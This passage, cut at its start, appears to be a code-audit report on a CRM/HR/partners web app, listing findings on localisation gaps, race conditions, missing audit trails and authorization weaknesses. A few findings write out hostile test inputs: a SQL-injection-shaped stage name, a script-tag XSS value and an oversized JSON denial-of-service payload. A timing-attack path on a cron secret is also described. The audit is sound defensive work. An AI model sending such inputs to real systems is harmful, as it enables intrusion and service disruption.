SCEN: An Arabic-locale user (any role) clicks the bell icon in the global header. The popover that appears shows English-only: aria-label 'Notifications (X unread)', heading 'Notifications', button 'Mark all read', tab labels 'All / Unread / HR / CRM / Partners', loading 'Loading…', empty 'No notifications.', and error toasts 'Couldn't mark notification as read' / 'Couldn't mark all as read'. The unread
---
FILE: super-app/src/components/layout/ImpersonationBanner.tsx:43-55
SUM: Sticky impersonation banner shown on every authenticated page is fully hardcoded English.
SCEN: An admin set to Arabic locale uses /admin/impersonate to act as another user. The banner that appears on every page reads 'You're acting as <Name>. Every action is audit-logged under your admin account.' and the button 'Return to admin'. Toast 'Couldn't stop impersonation' on line 28 is also English-only.
---
FILE: super-app/src/app/(dashboard)/hr/dashboard/page.tsx:216-220
SUM: HR dashboard 'Recent incidents' table has hardcoded English column headers and text-left alignment.
SCEN: An Arabic-locale HR manager or super_admin opens /hr/dashboard. The recent-incidents widget renders <th> elements with literal strings 'Employee', 'Violation', 'Date', 'Action', 'Status' and className 'text-left' (lines 216-220). The same file has a 'No incidents this month' string at line 206. The locale is read into `isAr` at line 259 but never used for these headers.
---
FILE: super-app/src/components/hr/attendance/CheckInOut.tsx:67-141
SUM: Employee Check-In widget uses hardcoded 'en-US' locale for dates/times, hardcoded English day-of-week and legend labels, and color-only status dots with no aria-label.
SCEN: An Arabic-locale employee opens /hr/employee/attendance. LiveClock at lines 67-72 calls toLocaleTimeString('en-US') and toLocaleDateString('en-US') — date/time print English ('Monday, January 15, 2026'). MiniCalendar at line 97 hardcodes month name to en-US; line 103 hardcodes the day-of-week row ['Su','Mo','Tu','We','Th','Fr','Sa']; lines 129-134 hardcode legend ['On Time','Late','Absent','Leave'
---
FILE: super-app/src/components/shared/Pagination.tsx:17-38
SUM: Shared Pagination component (used across modules) is hardcoded English and uses physical chevrons that don't flip in RTL.
SCEN: Any list page that uses <Pagination/> (shared/Pagination) renders 'Page N of M' on line 17-19, 'Previous'/'Next' literal buttons on lines 27-37, and ChevronLeft / ChevronRight icons that point the same physical direction regardless of dir='rtl'. In Arabic mode the 'Next' button points right with a right chevron — the opposite of natural Arabic flow.
---
FILE: super-app/src/components/tasks/TaskRow.tsx:18-122
SUM: TaskRow renders hardcoded English type labels, due-date labels, priority enum literals, and an icon-only Done button below the 32px tap target.
SCEN: An Arabic-locale user opens /tasks. Each row shows: TYPE_LABEL map lines 18-28 ('Task', 'Call', 'Email', 'Follow-up', etc.); formatDue returns literal 'Today', 'Tomorrow', and `${n}d overdue` (lines 44-46); the priority badge on line 110-112 shows raw enum `task.priority` ('LOW'/'MEDIUM'/'HIGH'/'URGENT') without translating. Lines 80, 91, 130 have hardcoded English aria-labels. Line 100 uses `text
---
===== MEDIUM (67) =====
FILE: src/app/api/crm/opportunities/bulk/route.ts:125-168
SUM: Bulk reassign-owner does not recompute estimatedValueEGP/weightedValueEGP yet still touches financial state via the new owner's potential currency-rate context — and never invalidates next-action/SLA timers on transfer
SCEN: MANAGER bulk-reassigns 30 opps from REP A to REP B via the list bulk-action. The handler updates ownerId only. No revalidatePath/refresh of any forecast surface, no nextActionDate reset (the SLA clock started under REP A's calendar but REP B inherits the 'must touch by' date). For REPs filtered through the list ownerId param (just added per audit focus), the cache surface is /crm/opportunities — b
---
FILE: src/components/crm/opportunities/StageChangeModal.tsx:48-71
SUM: StageChangeModal does not reset state when reopened — stale lossReasonId/contractUrl carry across opps if user cancels then opens for a different opp
SCEN: On detail page, user clicks 'Select stage', picks LOST, fills lossReasonId='LR_PRICE' and lostToCompetitor='Acme', cancels. They navigate to a different opp's detail page (same client component re-mounts on route change, but if the kanban-spawned StageChangeModal stays mounted while a different card is dragged, state persists). Drags to LOST again — old lossReasonId is pre-selected from previous o
---
FILE: src/lib/crm/validations/opportunity.ts:49-108 + src/components/crm/opportunities/OpportunityForm.tsx:121-177
SUM: OpportunityForm uses createOpportunitySchema even in edit mode — required fields can never be cleared on edit, and missing customerCompanyName from legacy rows blocks save
SCEN: Manager opens edit for a legacy opp whose customerCompanyName is null (very old opp pre-free-text-customer-name). Edit page hydrates `customerCompanyName: opp.customerCompanyName ?? opp.company?.nameEn ?? ''`. If company is also null/empty, initial value is ''. React-hook-form uses createOpportunitySchema (resolver at line 129) which requires customerCompanyName min(1). User opens edit just to upd
---
FILE: src/app/(dashboard)/crm/opportunities/actions.ts:603-633
SUM: deleteOpportunity uses scopeOpportunityByRole(session) to find existing but no deletedAt filter — soft-deleted opps can be 're-deleted', double-stamping deletedAt and writing duplicate activity logs
SCEN: Opp X was soft-deleted yesterday by REP Y. Today a MANAGER calls DELETE /api/crm/opportunities/X (e.g. via the bulk delete which independently filters deletedAt:null, but the single-opp action.ts doesn't). The findFirst at line 605 doesn't filter deletedAt — so it returns the already-deleted row. The check at line 609 throws 'Opportunity not found' (existing.deletedAt is truthy) — OK. But the SCOP
---
FILE: super-app/src/app/api/crm/cold-leads/folders/[id]/assign/route.ts:96-104
SUM: Folder bulk-assign does N sequential updates with no transaction; a mid-loop failure leaves leads half-assigned.
SCEN: Manager picks a folder of 4,000 leads and clicks Assign to 3 reps. The handler iterates leadIds[i] and issues 4000 awaited db.crmColdLead.update calls outside any $transaction. At lead 2,317 the DB drops the connection (Neon scale-down). The handler throws; previous 2,316 leads are already assigned in the DB, the next 1,683 remain unassigned. The folder card's liveCount stays the same; no error su
---
FILE: super-app/src/app/api/crm/cold-leads/bulk-delete/route.ts:49-63
SUM: Bulk-delete blocked-list is truncated to 10 rows; the error message reports that truncated count as the total.
SCEN: Manager selects 200 leads in the table, 50 of which are CONVERTED. POSTs /bulk-delete. findMany applies take: 10, so blocked.length === 10 (even though 50 are actually blocked). Response: `'10 of the selected leads are converted ... "a", "b", ...'` plus blockedIds with 10 IDs. The user unchecks the 10 named leads and retries — gets the same error with 10 different leads. Repeated trial-and-error u
---
FILE: super-app/src/app/api/crm/cold-leads/import/route.ts:411-429
SUM: Import writes the batch row first, then loops createMany outside any transaction — failure midway leaves a 'folder' claiming N rows that has fewer.
SCEN: Admin uploads a 40,000-row sheet. Batch row is created with rowCount=40000. The loop chunks 1000 inserts at a time. After chunk 27 (27,000 rows) a network blip aborts the loop; the route throws. The CrmColdLeadImport row persists with rowCount=40000, but only 27,000 children landed. The folder card will show 'liveCount 27,000 of 40,000' as if 13,000 were lost to status changes — admin cannot tell 
---
FILE: super-app/src/app/api/crm/cold-leads/redistribute/route.ts + super-app/src/app/api/crm/cold-leads/distribute/route.ts + super-app/src/app/api/crm/cold-leads/[id]/route.ts
SUM: No audit/history rows are written when manager redistributes, distributes, archives, or admin-overrides status/assignedToId — only the disposition endpoint logs to CrmColdLeadDisposition.
SCEN: Manager runs Distribute on 100 leads (100 assignedToId changes, no audit), Redistribute resetStatus on 50 leads (50 status flips to NEW, no audit), DELETE redistribute (50 leads ARCHIVED, no audit), and edits a lead's status to CONVERTED via PATCH (no audit). The only data trail of who reassigned which lead at what time is the lead's updatedAt column — already overwritten on the next touch. CrmCol
---
FILE: super-app/src/app/(dashboard)/crm/admin/stage-config/stage-config-client.tsx:161-187
SUM: handleAdd() computes displayOrder=configs.length, but configs includes soft-deleted (isActive=false) rows — newly added stage can clash with an existing active stage's displayOrder.
SCEN: Admin soft-deletes 3 stages (POSTPONED, LOST, WON). configs.length === 11 (all rows incl. inactive). Admin adds a new stage. displayOrder=11. Existing active stage at displayOrder=10 still exists. The pipeline orderBy: [{ displayOrder: 'asc' }, { stage: 'asc' }] then ties on displayOrder, sorting alphabetically. Or if admin had previously rearranged orders, the new stage lands in an unexpected pos
---
FILE: super-app/src/app/api/crm/pipeline/route.ts:142-250
SUM: PATCH does not enforce CrmStageActivityQuota — the activity-quota gate documented at schema.prisma:2959 is not checked on drag-drop.
SCEN: Admin populates CrmStageActivityQuota with { stage: 'DISCOVERY', activityType: 'call', minCount: 2, windowDays: 30 } intending 'rep must log 2 calls in 30d before leaving DISCOVERY'. The schema comment at line 2959 says: 'Admin-defined, validated in changeStage alongside required-fields gating.' Neither changeStage() nor the PATCH route consult CrmStageActivityQuota. Drag-drop out of DISCOVERY suc
---
FILE: super-app/src/app/(dashboard)/crm/pipeline/client.tsx:128-153
SUM: Stage fetch errors are silently swallowed — when /api/crm/stages fails (network / 401), the board falls back to SPEC_STAGES but never surfaces the failure or retries.
SCEN: User loses network briefly during page load. fetch('/api/crm/stages') throws or returns non-OK. The .then chain coerces failure to null, and the second .then receives null → falls through to else { setStages(SPEC_STAGES...) }. No error toast, no spinner, no retry. The board renders the canonical 11 stages even if the admin actually has different labels/columns configured. Then refresh() runs succe
---
FILE: super-app/src/app/api/crm/pipeline/route.ts:135-140
SUM: stageSchema has no upper bound on newStage encoding — z.string().min(1).max(40) accepts arbitrary 40-char text, including SQL-shaped strings, before the existence check.
SCEN: An attacker hits PATCH /api/crm/pipeline with { opportunityId: their_own_id, newStage: "'; DROP TABLE crm_opportunities; --" } (33 chars). Zod parses OK. db.crmStageConfig.findFirst({ where: { stage: newStage, isActive: true } }) returns null (Prisma parameterises) so the request 400s — but the error message echoes the raw input ('Stage "<input>" isn\'t configured') which can be reflected to other
---
FILE: super-app/src/app/(dashboard)/crm/pipeline/client.tsx:192-217
SUM: Optimistic stage-move update never re-fetches the opportunity, so probabilityPct + weightedValueEGP shown on the card stay stale after a successful drag.
SCEN: Rep drags an opp from CONTACTED (10%) to NEGOTIATION (70%). moveStage() optimistically updates only `stage`. PATCH succeeds and the server recomputes probabilityPct=70 + weightedValueEGP. Client never refreshes — opps state still shows probabilityPct=10. The card displays '10%' while the column header tallies a weighted value also out of sync (column total is recomputed from stale per-card weighte
---
FILE: super-app/src/app/api/crm/users/mentionable/route.ts:18-58
SUM: Mentionable picker exposes the entire active CRM roster with no entity/team scope and only checks `modules.includes('crm')` (no crmProfileId required)
SCEN: A user with `modules: ['crm']` but no CrmUserProfile (e.g. provisioning race, recently revoked profile) still hits this endpoint successfully on line 20 — there is no `session.user.crmProfileId` guard. They can enumerate every active CRM user's fullName, email, role, avatar. Additionally, even a fully provisioned REP gets the entire roster across every entity, undermining any entity-scoping rule a
---
FILE: super-app/src/components/crm/opportunities/OpportunityComments.tsx:249-300
SUM: Mention picker keyboard handler can crash on stale cursor index when results list shrinks under it
SCEN: User types `@al`, picker returns 7 results (cursorIdx can reach 6 after arrow-down navigation, pickerHasMoved=true). User continues typing to `@alex`, the 150ms debounce fires (lines 180-194), results shrink to 2 entries. `setPickerCursorIdx(0)` only fires when the fetch successfully resolves (line 189) — but in the small window between request and response, pickerResults still holds 7 entries; if
---
FILE: super-app/src/app/api/crm/opportunities/[id]/comments/[commentId]/route.ts:67-71
SUM: DELETE does not publish an SSE event, so other viewers' threads keep showing the deleted comment until their next 30s poll
SCEN: Two reps have the same opp detail panel open. Rep A deletes their comment (lines 67-70 soft-delete only). No `data.invalidate` or `comment.deleted` is published to the bus. Rep B's 30s polling loop in OpportunityComments.tsx:163 will refetch and the comment disappears — up to 30 seconds later. Meanwhile, anyone who was @-mentioned in that comment still has the CrmNotification in their bell (intent
---
FILE: super-app/src/components/crm/opportunities/OpportunityComments.tsx:308
SUM: `stillReferenced` mention filter is fooled by substring matches and partial cuid prefixes
SCEN: User picks two teammates whose CRM profile ids share a prefix (cuids are alphanumeric and a real collision on 25+ chars is impossible, but the line `mentionIds.filter((id) => draft.includes(\`@${id}\`))` doesn't anchor the id boundary — a leading-substring of one id followed by a slash, hyphen, or alpha char passes). More concretely: user picks teammate-A producing token `@<A-id>` then deletes it 
---
FILE: super-app/src/components/crm/opportunities/OpportunityComments.tsx:137-168
SUM: Background poll silently clobbers the optimistic comment between server response and state reconciliation
SCEN: User clicks Send at t=29.9s. The optimistic comment is pushed at line 332. The 30s interval (line 163) fires at t=30.0s and refetches BEFORE the POST response lands. The GET returns the canonical row list (without the still-in-flight comment because the server hasn't committed yet) — `setComments(data.comments ?? [])` on line 145 replaces the entire array, dropping the optimistic placeholder. Then
---
FILE: super-app/src/components/crm/opportunities/OpportunityComments.tsx:81-89
SUM: Mention regex matches generic strings, producing chip-style fallthroughs for arbitrary `@<word>` content of 8+ chars
SCEN: Rep writes `@everyone please review` or pastes a Github handle like `@octocatuser`. The regex `/@([A-Za-z0-9_-]{8,})/g` matches `@octocatuser` (12 chars). `byId.get("octocatuser")` is undefined, so the renderer falls through and pushes the raw text. That part is OK — but the same regex also matches inside URLs / pasted email-fragments that happen to have an 8-char alphanumeric alias. Combined with
---
FILE: super-app/src/components/layout/NotificationCenter.tsx:82-90
SUM: SSE `notification.created` toast renders even for notifications in modules the user no longer has access to
SCEN: User had `modules: ['crm','hr']` and an HrNotification arrived. Then admin revokes `hr`. The next session refresh removes `hr` from the session, BUT the per-user SSE channel still publishes the historical events; if the browser tab held the connection open across the revocation, the JSON-parse path on line 85-87 will fire `toast.message(data.title, ...)` for an HR event even though the bell query 
---
FILE: super-app/src/app/(dashboard)/crm/admin/dashboards/client.tsx:141,547-553
SUM: Owner is included in their own SpecificPeoplePicker roster; ticking themselves bumps the visible count but the server silently strips them, causing 'X people will see this' to disagree with the saved share rows.
SCEN: ADMIN_FOO opens dashboard edit, switches to 'Specific people', sees themselves in the roster (the mentionable endpoint returns ALL active CRM profiles without excluding the caller). They click 'Select all' (line 555-559): the helper text says e.g. '5 people will see this dashboard as a tab.' They Save. The server (route.ts:81) drops the owner from `deduped` before insert, so only 4 share rows are 
---
FILE: super-app/prisma/schema.prisma:3497-3515
SUM: Schema comment says 'One row per (owner, name)' but there is no @@unique([ownerId, name]) — owners can create unlimited duplicate-named dashboards.
SCEN: Owner POSTs `{ name: 'Pipeline review', layoutJson: [...] }` twice. Both succeed (route.ts:161-177 has no name-uniqueness check). For an EVERYONE dashboard, every CRM user now sees two tabs literally labelled 'Pipeline review' — both pointing at different layouts — and there's no way to disambiguate in CustomDashboardTabs.tsx:156-166 because the tab label is just `{d.name}`.
---
FILE: super-app/src/app/api/crm/dashboards/route.ts:39,51
SUM: layoutJson is unbounded in both POST and PATCH — Zod accepts any array length and each element is `z.record(z.string(), z.unknown())` with no key/value caps. A storage / response-size DoS is trivially reachable.
SCEN: Any CRM user POSTs `{ name: 'x', layoutJson: Array(50_000).fill({ kind: 'x'.repeat(1000), padding: 'a'.repeat(10_000) }) }`. The Zod schema (`z.array(z.record(z.string(), z.unknown()))` at line 39) accepts this. Prisma writes it to jsonb without complaint up to Postgres' 1 GB cell limit. The next GET /api/crm/dashboards loads it back into every recipient's session (for an EVERYONE dashboard) and p
---
FILE: super-app/src/app/api/crm/dashboards/route.ts:39
SUM: layoutJson element objects accept any `kind` string but the API never rejects unknown kinds — the consumer renders them as a tile titled with the raw kind string.
SCEN: Owner POSTs `{ name: 'X', layoutJson: [{ kind: '<script>alert(1)</script>' }] }`. Zod accepts because `kind` only needs to be a string. CustomDashboardTabs renders the tile via `WIDGET_LABELS[w.kind] ?? w.kind` (line 94) — `w.kind` is interpolated as JSX text so XSS is escaped, BUT every recipient of an EVERYONE dashboard sees a tile labelled with the raw owner-controlled string. Worse: the admin-
---
FILE: super-app/src/app/api/crm/dashboards/route.ts:90-111
SUM: GET (and the entire dashboards route) gates on `crmProfileId` only, never on `session.user.modules?.includes('crm')`, inconsistent with the rest of the CRM API surface.
SCEN: All four handlers do `ownerOrNull(session)` which only checks `session.user.crmProfileId`. Compare /api/crm/users/mentionable/route.ts:19-22 which checks both `session.user.id` AND `session.user.modules?.includes('crm')`. The auth code (lib/auth.ts:495-502) resets crmProfileId when crmAccess is false, so today the two checks align. But this is the only CRM route auditing the calling-user via `crmP
---
FILE: super-app/src/app/(dashboard)/crm/calls/actions.ts:85-94 + super-app/src/lib/crm/rbac.ts:26-41
SUM: ASSISTANT logging a call on a touched opportunity overwrites the rep's nextActionText/Date without warning
SCEN: An ASSISTANT approved meeting M for opportunity OPP-123 (owned by REP X). The scope clause `meetings.some.OR.approvedById = session.id` grants the assistant access to OPP-123. The assistant POSTs `/api/crm/calls` with `opportunityId: 'OPP-123'`, `nextActionText: 'call again next week'`, `nextActionDate: '...'`. createCall() unconditionally `tx.crmOpportunity.update({ nextActionText, nextActionDate
---
FILE: super-app/src/app/api/crm/daily-reports/route.ts:101-140
SUM: POST upsert blanks notes/counters from the prior submission if the form was reset before refresh() filled it
SCEN: Rep loads /crm/reports. useEffect kicks off refresh(); they immediately type a Calls value and click Save before refresh resolves. The Save handler sends `notes: ''` (initial state) plus whatever they typed. The route does `update: { notes: data.notes ?? '' }` — server-side it unconditionally overwrites notes to empty string. The day's existing notes (saved earlier that morning) are wiped, no diff
---
FILE: super-app/src/app/api/crm/daily-reports/route.ts:101-140
SUM: Daily-report POST doesn't capture actingAdminId — impersonating admin's submissions are invisible in audit
SCEN: Admin impersonates Sara (REP). Per auth.ts, session.user.crmProfileId is Sara's; session.user.actingAsCrmProfileId is the admin's profile. Admin POSTs a daily report. The route stores `repId: crmProfileId` (Sara) and no actingAdminId column on the CrmDailyReport row. The row reads as if Sara herself logged inflated activity metrics.
---
FILE: super-app/src/app/api/crm/meetings/[id]/approve/route.ts:55-70 + .../deny/route.ts:54-68
SUM: Approve/deny endpoints don't record actingAdminId on the meeting — admin impersonation is lost from the approval audit trail
SCEN: Admin impersonates assistant Layla. session.user.crmProfileId = Layla. Admin clicks Approve on meeting M. The route writes `approvedById: session.user.crmProfileId` (Layla) and never touches actingAdminId. The CrmMeeting row's approvedById says Layla, no record the admin was the actual actor. Same for deny: deniedReason + status flip with no admin trail.
---
FILE: super-app/src/app/api/crm/meetings/[id]/route.ts:168-176
SUM: DELETE on a meeting lets the original scheduler hard-delete an APPROVED or DONE meeting, silently destroying the approval + outcome history
SCEN: REP books meeting M1, assistant approves it, meeting happens, status flips to DONE (notes appended, CrmNote and CrmActivityLog rows created on the linked opp). The rep then `DELETE /api/crm/meetings/<id>`. loadOrError passes because scheduledById === ownProfile. The route runs `db.crmMeeting.delete({ where: { id } })` with no status guard. The CrmNote / CrmActivityLog rows on the opp may FK-refere
---
FILE: super-app/src/app/api/crm/reports/sales-report/export/route.ts:301-352
SUM: Excel pivot SUMIF formulas break when serviceLabels has > 26 entries OR contains formula characters — the `String.fromCharCode(64 + n)` indexing only supports columns A-Z.
SCEN: An admin who hasn't yet curated products has services derived from join of product names, leading to long labels like `Air Conditioning Unit, Installation Service, Annual Maintenance` joined into a single label. `serviceLabels.slice(0, 10)` (line 299) caps at 10 columns so the > 26 column overflow doesn't fire HERE — but: line 305 stores label as Cell value via `sLR.getCell(i+1).value = label`. La
---
FILE: super-app/src/app/api/crm/reports/activity-correlations/route.ts:69-87
SUM: Activity correlations omits reps who closed wins but logged no daily reports — top performers vanish from the scatter.
SCEN: A senior rep skips filing daily reports but closes 5 WON deals worth EGP 2M in 90 days. The `activityRows` groupBy at line 35 only returns reps with at least one daily-report row. `points` at line 69 maps over `activityRows`, so this rep never appears in the response. The dashboard's scatter plot shows a fictional 'no top performers exist' picture and the linear correlation client-side underestima
---
FILE: super-app/src/app/api/crm/reports/cohort-matrix/route.ts:45-72
SUM: Cohort matrix silently drops wins with `dateClosed < createdAt` (negative offset) and wins beyond month 11 (>= offset 12).
SCEN: Admin backdates a customer migration: opp's createdAt is set to today but dateClosed is yesterday (data-cleanup scenario). `monthsBetween(createdAt, dateClosed)` returns a negative offset, the Map records it at key -1, but the cumulative loop only iterates `for (let off = 0; off <= 11; off++)` (line 62), so the win is invisible in the cohort row. Likewise a deal that took 13 months to close is dro
---
FILE: super-app/src/app/(dashboard)/crm/admin/workflows/client.tsx:276-286 + super-app/src/app/api/crm/admin/workflows/route.ts:88-102
SUM: Clearing all trigger/condition clauses on an existing workflow is silently ignored — PATCH treats `undefined` as 'preserve old value', so the old clauses persist in the DB.
SCEN: Admin edits an existing workflow that has `conditionJson = {all: [{field:'toStage', op:'eq', value:'WON'}]}`. They remove the last condition row in the ClauseBuilder so triggerClauses/conditionClauses become []. `clausesToJson([], 'all')` returns null. The client guard `if (conditionJson) body.conditionJson = conditionJson` drops the key entirely. Server PATCH receives no `conditionJson` field, fa
---
FILE: super-app/src/app/(dashboard)/crm/admin/workflows/client.tsx:140-145 vs super-app/prisma/schema.prisma:2736
SUM: set-field UI lists `nextAction` as a text field but CrmOpportunity.nextAction is a Prisma enum (CrmNextActionType); admin-entered free text crashes the Prisma update.
SCEN: Admin picks set-field, field='Next action' (type=text), value='Call them tomorrow'. Saved fine — route does not validate field/value pairings. On trigger, runAction calls db.crmOpportunity.update({data: {nextAction: 'Call them tomorrow'}}). Prisma throws a PrismaClientValidationError for the enum field; engine catches in the per-run try/catch (line 361-369) and writes status='failed'. Repeated eve
---
FILE: super-app/src/lib/crm/workflows/engine.ts:303-332
SUM: Suppression window check is skipped entirely when `payload.entityId` is missing, so cron / system events that omit entityId can fail-spam every tick with no rate limit.
SCEN: A future cron-driven trigger calls fireWorkflow('cron.daily.tick', { actorId: null }) with no entityId. The condition `wf.suppressionWindowMinutes > 0 && payload.entityId` short-circuits on the missing entityId, the suppression query is skipped, runAction runs (and likely returns ok:false because notify-in-app / set-field / create-task all require entityType==='opportunity'+entityId). Every tick f
---
FILE: super-app/src/app/(dashboard)/crm/admin/workflows/client.tsx:485 (conditions ClauseBuilder fields)
SUM: Condition ClauseBuilder is bound to triggerDef.fields (only event-payload fields), so admins cannot filter on opportunity properties like priority/amount/owner that the engine could read via readPath.
SCEN: Admin wants a workflow: 'when stage changes AND opp.priority=HOT, notify'. The triggerKind 'opp.stage.changed' exposes only {toStage, fromStage, durationDays}. Priority is not listable. Admin gives up or writes the JSON manually. The engine itself reads dotted paths from the payload, but the stage-change caller (actions.ts:798-806) does not include priority in the payload anyway — so condition cov
---
FILE: super-app/src/lib/crm/workflows/engine.ts:303-316
SUM: Suppression query filters by `status: { in: ['success', 'failed'] }` but does NOT include 'running' — if a prior run is still in 'running' state (e.g., engine crashed mid-action), suppression is bypassed and the same workflow fires repeatedly.
SCEN: Engine crashes (process killed, db transient error) after creating the CrmWorkflowRun row at line 334 with status='running' but before the update at line 345. Status stays 'running' forever. Next matching event arrives within the suppression window: the recent-run lookup ignores 'running' rows, no match found, the suppression branch is skipped, a new 'running' row is created, runAction runs again.
---
FILE: super-app/src/app/api/hr/payroll/my-salary-slips/route.ts:16-90
SUM: Employees see provisional 'open' salary slips that have not been locked/finalized.
SCEN: An employee opens their salary-slip history page (the only consumer of this endpoint). The query at line 16 returns every hrMonthlySalary row regardless of status. As soon as an accountant runs payroll/calculate or /monthly/recalculate for the current month, the employee sees a numbers-not-yet-final slip — even though the lock-month route's notification text and the finalize route's salary_slip_re
---
FILE: super-app/src/lib/hr/audit.ts:25-64
SUM: Under super_admin impersonation every HR action is attributed to the target user; no HR route passes actingAdminId.
SCEN: super_admin impersonates hr_manager Alice (session.user.actingAsUserId is set per lib/auth.ts:59). Alice's session is what hits e.g. /api/hr/bonuses/{id}/approve. The approve route writes prisma.hrBonus.updateMany({approvedById: authUser.id}) — authUser.id is Alice's id, not the admin's — and never calls createAuditLog. The few HR routes that DO call createAuditLog (employees/route.ts:230, monthly
---
FILE: super-app/src/app/api/hr/attendance/leave-requests/[id]/deny/route.ts:31-37
SUM: Leave deny does not set approvedById or approvedAt, leaving denial actor anonymous; approve does set both — asymmetry breaks audit and 'denied by' UI labels.
SCEN: HR Manager clicks Deny on a pending leave. Route POSTs to /api/hr/attendance/leave-requests/[id]/deny. Update payload at lines 33-36 only sets status='denied' and updatedAt — approvedById and approvedAt remain null. The serializer at lines 72-76 then renders approved_by_name as null. The list page's 'denied by' column is permanently empty. By contrast the approve handler (approve/route.ts:34-36) w
---
FILE: super-app/src/app/api/hr/expenses/route.ts:7-81
SUM: Expenses module exposes only GET and POST — there is no approve/reject/reimburse endpoint, no company scoping in the list for HR/admin, no receipt OCR or attachment validation, and expenses are immediately set to 'SUBMITTED' with no manager workflow.
SCEN: Employee POSTs an expense via /api/hr/expenses — it is stored with status: 'SUBMITTED'. There are no routes in /api/hr/expenses/[id] or /approve/reimburse/reject to advance the status, so 'APPROVED'/'REJECTED'/'REIMBURSED' values can never be set through any endpoint shown here. HR Manager GET returns all expenses globally with no company filter (lines 33-35: ownEmp-based scope only triggers for n
---
FILE: super-app/src/app/api/partners/deals/[id]/route.ts:58-99
SUM: Re-WONning a previously-LOST deal throws an uncaught P2002 from the unique commission and surfaces as 500 instead of a clean state-machine error
SCEN: There is no deal state-machine restricting transitions. Partner PATCHes their PENDING deal to status:'WON' — commission row created. Partner then PATCHes status:'LOST' (falls through to the generic update branch — no commission cleanup). Partner then PATCHes status:'WON' again with a new value: the WON branch's updateMany succeeds (status !== WON now, since it's LOST), then tx.partnerCommission.cr
---
FILE: super-app/src/app/(dashboard)/partners/commissions/page.tsx:39-45
SUM: Commissions page: summary fetch has no error handling, list fetch has no error handling, and `loading` is never reset on page change so the spinner doesn't show on page 2
SCEN: useEffect runs api.get('/commissions/summary') with no .catch and no .finally — any 4xx/5xx silently leaves `summary` null, so the four KPI cards render as skeletons forever with no error UI. api.get('/commissions?...') has only .finally — a network error leaves commissions = [] with no error toast. setPage(2) does not call setLoading(true) before the next fetch, so pagination changes look instant
---
FILE: super-app/src/app/api/partners/registrations/route.ts:24-33
SUM: Registrations GET has no pagination; admin call returns the entire registration table, partner call returns all of their own
SCEN: GET /api/partners/registrations runs findMany with where + orderBy but no take/skip. For a platform admin (user.partnerId undefined), `where = {}` returns every row. For a long-tenured partner, all of their own registrations come back in one payload.
---
FILE: super-app/src/lib/auth.ts:285-533
SUM: JWT only refreshes every 60s, so impersonation start has up to a 60s blind window where session is stale and route gates see admin while banner sees admin too
SCEN: Admin clicks `Start impersonation`. The client at admin/impersonate/client.tsx line 86 does call `refreshSession()` before reload, which mitigates the common path. But any other entry into the app within 60s of the row being written that does NOT come from the client's reload (e.g. another open tab with a polling fetch, a deep-link the admin opens manually) reads a JWT where modulesRefreshedAt < 6
---
FILE: super-app/src/lib/auth.ts:304-307, 392-399
SUM: Stop-detection treats DB error and row-missing identically once token.actingAs has been seeded, defeating the documented `transient blip preserves state` design
SCEN: While impersonation is active (token.actingAs set), the JWT runs on a stale refresh. The findUnique at line 334-344 wraps in try/catch and sets `impersonation = undefined` on DB error, `null` on row missing. Line 392 then branches `else if (impersonation === null && token.actingAs)` to drop impersonation. But on Neon connection blips, `impersonation` is undefined -- the code falls through line 345
---
FILE: super-app/src/proxy.ts:378-388
SUM: Impersonation-stop carve-out also exempts the start UI `/admin/impersonate`, letting impersonated sessions reach a dead-end page
SCEN: During active impersonation, the admin's session has the target's hrRoles (no super_admin). The proxy carve-out `isImpersonationStop` is true for both `/api/admin/impersonate/stop` AND `/admin/impersonate`. The carve-out skips findDeniedRule. The page at app/(dashboard)/admin/impersonate/page.tsx line 17-22 re-checks isPlatformAdmin and renders `<div>Unauthorized</div>`. The impersonating admin la
---
FILE: super-app/src/app/api/admin/impersonate/route.ts:47-57, 67-92
SUM: Start endpoint has a TOCTOU race against the unique constraint and does not validate target is active
SCEN: (a) Race: Two simultaneous POST /api/admin/impersonate by the same admin both pass the existing-check at line 47 (returns null for both), then both enter db.$transaction. One succeeds; the second throws a Prisma P2002 unique constraint violation on `adminUserId` and bubbles up as an unhandled 500. The admin sees a generic server error instead of a 409. (b) Target validation: target.findUnique only
---
FILE: super-app/src/app/api/admin/users/[id]/route.ts:33-39, super-app/src/app/api/admin/users/[id]/modules/route.ts:30-36
SUM: Inline isPlatformAdmin duplicated across ~10 routes — recurring drift bug the admin-gates.ts library was meant to prevent
SCEN: src/lib/crm/admin-gates.ts:25-31 declares the canonical isPlatformAdmin. But /api/admin/users/[id]/route.ts, /api/admin/users/[id]/modules/route.ts, /api/admin/impersonate/route.ts, /api/admin/impersonate/stop/route.ts, /api/admin/sequential-workflows/[id]/route.ts, /api/admin/sequential-workflows/[id]/trigger/route.ts, /api/admin/sequential-workflows/runs/route.ts, /api/admin/sequential-workflows
---
FILE: super-app/src/app/api/cron/recurring-tasks/route.ts:19-33
SUM: Cron secret compared with non-constant-time string equality — timing oracle
SCEN: `if (auth === \`Bearer ${expected}\`) return true` at line 23 leaks how many bytes matched per byte of latency. An external attacker who can hit /api/cron/recurring-tasks can recover the CRON_SECRET one byte at a time given enough requests. CRON_SECRET in turn lets them trigger task spawning + run arbitrary recurring workflows.
---
FILE: super-app/src/app/api/crm/saved-views/[id]/route.ts:39-44
SUM: Platform partners-admin (no CRM profile) can edit/delete any CRM rep's saved view, even private ones
SCEN: A user with only the partners module + no partnerId calls PATCH /api/crm/saved-views/<repsViewId>. `ownerOrForbid` at line 39-44 sets `isPlatformAdmin = hrRoles.includes('super_admin') || (modules.includes('partners') && !partnerId)`. They bypass the owner check at line 43 and can rename, re-share, or delete any rep's private saved view — including flipping isShared to publish a rep's working filt
---
FILE: super-app/src/app/api/crm/meetings/route.ts:175-252
SUM: Meeting conflict-detection is TOCTOU — two reps double-book the same product slot or the same rep at the same time.
SCEN: Two reps book a DEMO meeting for the same customerNeed='Product-X' at 2026-06-09 10:00 within 50 ms of each other. Both POSTs reach `selfConflict` and `productConflict` checks at lines 183 and 198 — both see no conflict because neither row exists yet. Both then call `generateCode()` (also racy, see auto-code finding) and `db.crmMeeting.create` (NOT wrapped in a $transaction with the overlap check)
---
FILE: super-app/src/app/api/admin/users/[id]/reset-password/route.ts:70-102
SUM: Admin password reset commits before audit log — and skips audit entirely for non-HR-linked admins.
SCEN: A partners-admin (no HrUserProfile) clicks 'Reset password' for a user. The password update at line 74 commits. The `actorLinked` lookup at line 87 returns null (the partners-admin has no hrUserProfile), so the `if (actorLinked)` branch at line 91 is SKIPPED and NO HrAuditLog row is written. The endpoint returns 200 ok. From the audit page nobody can see who reset the password. Even for super_admi
---
